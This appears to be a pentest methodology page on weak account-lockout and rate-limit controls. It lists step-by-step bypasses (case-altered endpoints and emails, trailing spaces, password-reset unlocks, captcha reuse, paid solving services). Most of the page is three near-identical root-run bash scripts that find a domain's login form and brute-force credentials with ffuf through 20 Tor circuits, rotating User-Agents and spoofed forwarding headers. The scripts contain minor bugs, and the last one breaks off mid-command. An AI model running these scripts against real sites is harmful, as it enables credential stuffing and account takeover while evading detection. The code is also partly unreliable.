# Weak Lock Out Mechanism

## Check List

* [ ] Evaluate the account lockout mechanism’s ability to mitigate brute force password guessing.
* [ ] Evaluate the unlock mechanism’s resistance to unauthorized account unlocking.

## Methodology&#x20;

### Black Box

#### Account Lockout Bypass

{% stepper %}
{% step %}
Perform 10 consecutive login attempts with incorrect credentials.
{% endstep %}

{% step %}
Observe Error Message Change Note the response shifting to "Something went wrong" after the 10th failed attempt
{% endstep %}

{% step %}
Login with valid credentials immediately after the failed attempts and confirm a successful login
{% endstep %}

{% step %}
Verify that login is successful despite the triggered lockout Repeat to Validate Flaw Repeat failed login attempts and login with valid credentials to confirm the lockout bypass
{% endstep %}
{% endstepper %}

***

#### Account Lockout Bypass via Password Reset

{% stepper %}
{% step %}
Perform 5 consecutive login attempts with incorrect passwords using the target endpoint
{% endstep %}

{% step %}
Observe the account lockout after the 5th failed login attempt
{% endstep %}

{% step %}
Submit a POST request to the forgot password endpoint with the email of the locked account
{% endstep %}

{% step %}
Attempt to log in again with a new password to confirm that the account is unlocked
{% endstep %}

{% step %}
Continue sending login attempts and forgot password requests after every 5th failed attempt to sustain the attack
{% endstep %}
{% endstepper %}

***

#### Rate Limit Bypass via Endpoint Case Manipulation

{% stepper %}
{% step %}
Access https://app.target.com/signin and enter a valid email with an incorrect password for testing
{% endstep %}

{% step %}
Use Burp Suite to intercept the login request sent to POST `/auth/identity/callbac[k]`
{% endstep %}

{% step %}
Change the endpoint to POST `/auth/identity/callbac[K]` by altering the case of the last letter
{% endstep %}

{% step %}
Send the modified request to Burp Intruder and initiate a brute force attack with a password list
{% endstep %}

{% step %}
Observe that there is no rate limit after 1000 attempts; identify the single 200 response indicating a correct email and password
{% endstep %}
{% endstepper %}

***

#### Password Reset Rate-Limit Bypass Via Trailing-Space Input Variation

{% stepper %}
{% step %}
Intercept the forgot password request
{% endstep %}

{% step %}
Send the request to the Repeater and forward it. You will receive a response indicating that the link to reset the password has been sent
{% endstep %}

{% step %}
Forward this request 4 more times. At this point, you should have received 5 password reset links in your email. After sending one more request, you will be blocked for 3 minutes
{% endstep %}

{% step %}
Modify the request to include a space after the email address

`email=’email@gmail.com ‘ [see the space before the last quote in the email].`
{% endstep %}

{% step %}
Send the above request 5 times, and you will receive 5 additional links in your email. After that, you will be blocked again
{% endstep %}

{% step %}
Repeat step 3 by adding another space after the email. By consistently adding a single space after every 5 attempts, you can successfully bypass the rate limit
{% endstep %}
{% endstepper %}

***

#### Rate Limit Bypass via Endpoint Case Variation & Parameter Tampering

{% stepper %}
{% step %}
Send the request to Intruder and set the attack type to Cluster Bomb
{% endstep %}

{% step %}
Add two positions as follows: the first at the endpoint and the second for the “q” variable

```http
POST /users/§reset-password§ HTTP/1.1
Host: api.example.eu
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.§5§
Accept-Encoding: gzip, deflate
Referer: https://app.redacted.eu/lost-password
Content-Type: application/json; charset=utf-8
Content-Length: 33
Origin: https://app.redacted.eu
Connection: close
Cookie: gcl=1.1.121338148.1680190017;
Sec-Fetch-Site: same-site

{"email":"wisax34347@djpich.com"}
```
{% endstep %}

{% step %}
The rate limit can be bypassed by changing the endpoint. For example, the original endpoint is ‘reset-password,’ and it can be altered to various combinations such as ‘Reset-Password’ and ‘RESET-PASSWORD’
{% endstep %}

{% step %}
To generate different combinations of endpoints, you can use Tinker (https://github.com/heydc7/Tinker) for parameter tampering
{% endstep %}

{% step %}
Payload 1

```
reset-password
Reset-Password
reset-Password
Reset-password
RESET-PASSWORD
Reset-passworD
reSet-passwOrd
resEt-passwoRd
rEset-pasSword
reSet-paSSword
rEsEt-pAssword
rEsEt-pAsswOrd
```
{% endstep %}

{% step %}
Payload 2

```
Numbers from 1 to 10 with 1 step
```
{% endstep %}

{% step %}
Start the attack. The rate limit will be bypassed & you can see 100s of emails in your mailbox
{% endstep %}

{% step %}
To make the attack appear more legitimate to the WAF, you can additionally set the Throttle (Intruder -> Options) to 1000 milliseconds (1 second)
{% endstep %}
{% endstepper %}

***

#### Account Lockout Bypass via Email Case Variation

{% stepper %}
{% step %}
Use an incorrect password and attempt to log in at `https://client.target.com` 16 times using an email like `g4l2562z6v@tidissajiiu.com` (Tip: Send the request to Burp Suite’s Repeater tool for easy replaying of attempts)
{% endstep %}

{% step %}
After 16 failed login attempts, the account will be locked. Even the correct password won’t work anymore

* Response from Burp Repeater
* `{ "message": "Request limit exceeded. Please try again later.", "type": "too-many-requests" }`
{% endstep %}

{% step %}
Change the case of a character in the email. For example, switch from `g4l2562z6v@tidissajiiu.com` to `g4l2562z6v@tidiSsajiiu.com` (s -> S)
{% endstep %}

{% step %}
Resume login attempts with any password, you’ll find that the rate limit doesn’t apply, even after 16 attempts
{% endstep %}

{% step %}
To verify, perform Step 3 and then log in with the correct password via the browser
{% endstep %}
{% endstepper %}

***

#### Reuse Previous Captcha <a href="#b198" id="b198"></a>

{% stepper %}
{% step %}
Identify a previously seen captcha Choose a captcha code that you have already seen or solved before Explanation: This method assumes that the same captcha code might be accepted multiple times
{% endstep %}

{% step %}
Prepare the form submission Construct the request to submit the captcha&#x20;

Example request:

```http
POST /submit-form HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

captcha=ABC123 #{ola_captch_value}
```
{% endstep %}

{% step %}
Submit the same captcha repeatedly Submit the identical captcha code (for example, "ABC123") multiple times. Explanation: By sending the same code repeatedly, you hope that at least one attempt will be accepted by the server
{% endstep %}
{% endstepper %}

***

#### Submit Empty Captcha <a href="#ece8" id="ece8"></a>

{% stepper %}
{% step %}
Trying to bypass the captcha by leaving the captcha field empty when submitting a form

```http
POST /submit-form HTTP/1.1 
Host: example.com 
Content-Type: application/x-www-form-urlencoded 

captcha=
```
{% endstep %}
{% endstepper %}

***

#### Alter Data Format <a href="#id-608b" id="id-608b"></a>

{% stepper %}
{% step %}
Changing the format in which data is sent to the server, such as converting it to JSON or plain text, in the hope that the captcha won't be validated
{% endstep %}

{% step %}
A sample POST request with JSON data instead of the expected XML data

```json
POST /submit-data HTTP/1.1 
Host: example.com 
Content-Type: application/json

{ 
    "key": "value", 
    "captcha": "YourCaptchaCodeHere" 
} 
```
{% endstep %}
{% endstepper %}

***

#### Change Request Method <a href="#id-52aa" id="id-52aa"></a>

{% stepper %}
{% step %}
Modify the way you send requests to the server by switching between different HTTP request methods like GET, POST, or PUT
{% endstep %}

{% step %}
A sample GET request instead of the expected POST request

```http
GET /submit-data?key=value&captcha=YourCaptchaCodeHere HTTP/1.1 
Host: example.com
```
{% endstep %}
{% endstepper %}

***

#### Manipulate Headers <a href="#id-462c" id="id-462c"></a>

{% stepper %}
{% step %}
Using custom headers like X-Forwarded-For, X-Remote-IP, X-Original-IP, X-Remote-Addr, etc., to make it appear as though the requests are coming from different IP addresses, thereby avoiding captcha validation
{% endstep %}

{% step %}
A sample GET request with a custom "X-Forwarded-For" header

```http
GET /page HTTP/1.1 
Host: example.com 
X-Forwarded-For: 127.0.0.1
```
{% endstep %}
{% endstepper %}

***

#### Inspect Parameters <a href="#id-8976" id="id-8976"></a>

{% stepper %}
{% step %}
Always thoroughly examine the entire request (body, headers, or uri part) and understand the purpose of each parameter. By changing certain parameter values, you might find a way to bypass the captcha

```http
POST /submit-form HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

user_id=12345
captcha=WXYZ789
```
{% endstep %}

{% step %}
In this case, the "user\_id" parameter might be related to captcha validation. By experimenting with different values for "user\_id," you may discover a way to bypass the captcha
{% endstep %}
{% endstepper %}

***

#### Human-Based Captcha Solving Services <a href="#f84c" id="f84c"></a>

{% stepper %}
{% step %}
Instead of automated methods, you can use human-based captcha-solving services where real individuals solve captchas for you in exchange for a fee
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet

### Lockout Mechanism <a href="#lockout-mechanism" id="lockout-mechanism"></a>

#### [Katana ](https://github.com/projectdiscovery/katana)& [Multitor ](https://github.com/trimstray/multitor)& [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano multitor-bruteforce.sh
```

```bash
#!/bin/bash

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 1 ]; then
    echo "Usage: $0 <domain.com>"
    exit 1
fi

URL="$1"
UA="/usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt"
USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
DEPS="git seclists tor npm proxychains nodejs obfs4proxy dnsutils bind9-utils haproxy privoxy ffuf"

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        color_print YELLOW "[!] Installing $pkg..."
        apt install -y "$pkg"
    fi
done

# install polipo
if ! command -v "polipo" >/dev/null 2>&1; then
    wget http://archive.ubuntu.com/ubuntu/pool/universe/p/polipo/polipo_1.1.1-8_amd64.deb -O /tmp/polipo_amd64.deb
    chmod +x /tmp/polipo_amd64.deb
    dpkg -i /tmp/polipo_amd64.deb
    rm -f /tmp/polipo_amd64.deb
fi

# Install Node.js packages
if ! command -v multitor &>/dev/null; then
    color_print GREEN "[*] Installing http-proxy-to-socks..."
    npm install -g multitor http-proxy-to-socks
fi

# Install multitor repo
if [ ! -d "/usr/share/multitor" ]; then
    git clone https://github.com/trimstray/multitor /usr/share/multitor
    chmod +x /usr/share/multitor/*
    cd /usr/share/multitor && sudo ./setup.sh install
    sudo chmod 700 /var/lib/multitor
    sudo chmod /usr/local/bin/multitor
    sudo chown debian-tor:debian-tor /var/lib/multitor
    color_print GREEN "[*] Successfully Installed multitor"
fi

# Ensure Tor service is running
if ! systemctl is-active --quiet tor; then
    service tor start
fi

# Start multitor
if command -v multitor &>/dev/null; then
    multitor -k &>/dev/null || true
fi

sudo multitor --init 20 --user debian-tor --socks-port 9000 --control-port 9900 --proxy privoxy

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:')

if [ -z "$LOGIN" ]; then
    color_print RED "[!] No login page found. Exiting."
    exit 1
fi

HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA check
if echo "$HTML" | grep -qiE "g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"; then
    color_print RED "[!] CAPTCHA detected. Brute-force aborted."
    exit 1
fi

# Extract Form Action & Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
if [[ "$ACTION" == /* ]]; then
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    FULL_ACTION=$(dirname "$LOGIN")"/$ACTION"
fi

# Extract Username & Password Fields
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

# CSRF Token Extraction
CSRF_FIELD=""
CSRF_VALUE=""
HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

# Prepare POST Data
DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"

COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I' | cut -d';' -f1 | grep -i 'PHPSESSID')

HEADERS=(
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  -H "Accept-Language: en-US,fa-IR;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "Origin: $URL"
  -H "Sec-GPC: 1"
  -H "Connection: keep-alive"
  -H "Referer: $LOGIN"
  -H "Cookie: $COOKIES"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Priority: u=0, i"
)

# Run FFUF
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}"
    ffuf -u "$FFUF_URL" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -w "$UA:FUZZ3" \
         -x "socks5://127.0.0.1:16379" \
         -X GET \
         -ac -c -r -mc 200 \
         -H "User-Agent:FUZZ3" \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -w "$UA:FUZZ3" \
         -x "socks5://127.0.0.1:16379" \
         -X POST -d "$DATA" \
         -ac -c -r -mc 200 \
         -H "User-Agent:FUZZ3" \
         "${HEADERS[@]}"
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x multitor-bruteforce.sh;sudo ./multitor-bruteforce.sh $WEBSITE
```

### **Unique Lockout Mechanisms**

#### [Katana](https://github.com/projectdiscovery/katana)[ ](https://github.com/trimstray/multitor)& [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano forwarded-bruteforce.sh
```

```bash
#!/bin/bash

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 1 ]; then
    echo "Usage: $0 <domain.com>"
    exit 1
fi

URL="$1"
UA="/usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt"
USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
DEPS="git seclists tor npm proxychains nodejs obfs4proxy dnsutils bind9-utils haproxy privoxy ffuf"

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        color_print YELLOW "[!] Installing $pkg..."
        apt install -y "$pkg"
    fi
done

# install polipo
if ! command -v "polipo" >/dev/null 2>&1; then
    wget http://archive.ubuntu.com/ubuntu/pool/universe/p/polipo/polipo_1.1.1-8_amd64.deb -O /tmp/polipo_amd64.deb
    chmod +x /tmp/polipo_amd64.deb
    dpkg -i /tmp/polipo_amd64.deb
    rm -f /tmp/polipo_amd64.deb
fi

# Install Node.js packages
if ! command -v multitor &>/dev/null; then
    color_print GREEN "[*] Installing http-proxy-to-socks..."
    npm install -g multitor http-proxy-to-socks
fi

# Install multitor repo
if [ ! -d "/usr/share/multitor" ]; then
    git clone https://github.com/trimstray/multitor /usr/share/multitor
    chmod +x /usr/share/multitor/*
    cd /usr/share/multitor && sudo ./setup.sh install
    sudo chmod 700 /var/lib/multitor
    sudo chmod /usr/local/bin/multitor
    sudo chown debian-tor:debian-tor /var/lib/multitor
    color_print GREEN "[*] Successfully Installed multitor"
fi

# Ensure Tor service is running
if ! systemctl is-active --quiet tor; then
    service tor start
fi

# Start multitor
if command -v multitor &>/dev/null; then
    multitor -k &>/dev/null || true
fi

sudo multitor --init 20 --user debian-tor --socks-port 9000 --control-port 9900 --proxy privoxy

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:')

if [ -z "$LOGIN" ]; then
    color_print RED "[!] No login page found. Exiting."
    exit 1
fi

HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA check
if echo "$HTML" | grep -qiE "g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"; then
    color_print RED "[!] CAPTCHA detected. Brute-force aborted."
    exit 1
fi

# Extract Form Action & Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
if [[ "$ACTION" == /* ]]; then
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    FULL_ACTION=$(dirname "$LOGIN")"/$ACTION"
fi

# Extract Username & Password Fields
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

# CSRF Token Extraction
CSRF_FIELD=""
CSRF_VALUE=""
HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

# Prepare POST Data
DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"

COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I' | cut -d';' -f1 | grep -i 'PHPSESSID')

HEADERS=(
  -H "Accept-Language: en-US,fa-IR;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "Origin: $URL"
  -H "Sec-GPC: 1"
  -H "Connection: keep-alive"
  -H "Referer: $LOGIN"
  -H "Cookie: $COOKIES"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Priority: u=0, i"
)

# Forwarded Header
cat > /tmp/forwarded.txt << EOF
X-Forwarded-Host: attacker.com
X-Forwarded-Port: 443
X-Forwarded-Scheme: https
Origin: null
nullOrigin: pay.attacker.com
X-Frame-Options: Allow
X-Forwarded-For: 127.0.0.1
X-Client-IP: 127.0.0.1
Client-IP: 127.0.0.1
Proxy-Host: 127.0.0.1
Request-Uri: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Forward-For: 127.0.0.1
Base-Url: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Url: 127.0.0.1
Redirect: 127.0.0.1
Real-Ip: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
UX-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
EOF

# Run FFUF
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}"
    ffuf -u "$FFUF_URL" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -w "$UA:FUZZ3" \
         -w "/tmp/forwarded.txt:FUZZ4" \
         -x "socks5://127.0.0.1:16379" \
         -X GET \
         -ac -c -r -mc 200 \
         -H "FUZZ4" \
         -H "User-Agent:FUZZ3" \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -w "$UA:FUZZ3" \
         -w "/tmp/forwarded.txt:FUZZ4" \
         -x "socks5://127.0.0.1:16379" \
         -X POST -d "$DATA" \
         -ac -c -r -mc 200 \
         -H "FUZZ4" \
         -H "User-Agent:FUZZ3" \
         "${HEADERS[@]}"
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x forwarded-bruteforce.sh;sudo ./forwarded-bruteforce.sh $WEBSITE
```

### Unlock Mechanism <a href="#unlock-mechanism" id="unlock-mechanism"></a>

#### [Katana](https://github.com/projectdiscovery/katana)[ ](https://github.com/trimstray/multitor)& [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano captcha-bruteforce.sh
```

```bash
#!/bin/bash

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 1 ]; then
    echo "Usage: $0 <domain.com>"
    exit 1
fi

URL="$1"
UA="/usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt"
USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
DEPS="git seclists tor npm proxychains nodejs obfs4proxy dnsutils bind9-utils haproxy privoxy ffuf"

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        color_print YELLOW "[!] Installing $pkg..."
        apt install -y "$pkg"
    fi
done

# install polipo
if ! command -v "polipo" >/dev/null 2>&1; then
    wget http://archive.ubuntu.com/ubuntu/pool/universe/p/polipo/polipo_1.1.1-8_amd64.deb -O /tmp/polipo_amd64.deb
    chmod +x /tmp/polipo_amd64.deb
    dpkg -i /tmp/polipo_amd64.deb
    rm -f /tmp/polipo_amd64.deb
fi

# Install Node.js packages
if ! command -v multitor &>/dev/null; then
    color_print GREEN "[*] Installing http-proxy-to-socks..."
    npm install -g multitor http-proxy-to-socks
fi

# Install multitor repo
if [ ! -d "/usr/share/multitor" ]; then
    git clone https://github.com/trimstray/multitor /usr/share/multitor
    chmod +x /usr/share/multitor/*
    cd /usr/share/multitor && sudo ./setup.sh install
    sudo chown debian-tor:debian-tor /var/lib/multitor
    sudo chmod /usr/local/bin/multitor
    sudo chown debian-tor:debian-tor /var/lib/multitor
    color_print GREEN "[*] Successfully Installed multitor"
fi

# Ensure Tor service is running
if ! systemctl is-active --quiet tor; then
    service tor start
fi

# Start multitor
if command -v multitor &>/dev/null; then
    multitor -k &>/dev/null || true
fi

sudo multitor --init 20 --user debian-tor --socks-port 9000 --control-port 9900 --proxy privoxy

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:')

if [ -z "$LOGIN" ]; then
    color_print RED "[!] No login page found. Exiting."
    exit 1
fi

HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA check
[ -z "$ACTION" ] && ACTION="$LOGIN"
if echo "$HTML" | grep -qiE "g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"; then
    CAPTCHA=""
fi

# Extract Form Action & Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
if [[ "$ACTION" == /* ]]; then
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    FULL_ACTION=$(dirname "$LOGIN")"/$ACTION"
fi

# Extract Username & Password Fields
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

# CSRF Token Extraction
CSRF_FIELD=""
CSRF_VALUE=""
HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

# Prepare POST Data
DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2&${CAPTCHA}"
[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"

COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I' | cut -d';' -f1 | grep -i 'PHPSESSID')

HEADERS=(
  -H "Accept-Language: en-US,fa-IR;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "Origin: $URL"
  -H "Sec-GPC: 1"
  -H "Connection: keep-alive"
  -H "Referer: $LOGIN"
  -H "Cookie: $COOKIES"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Priority: u=0, i"
)

# Run FFUF
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}&${CAPTCHA}"
    ffuf -u "$FFUF_URL" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -w "$UA:FUZZ3" \
         -x "socks5://127.0.0.1:16379" \
         -X GET \
         -ac -c -r -mc 200 \
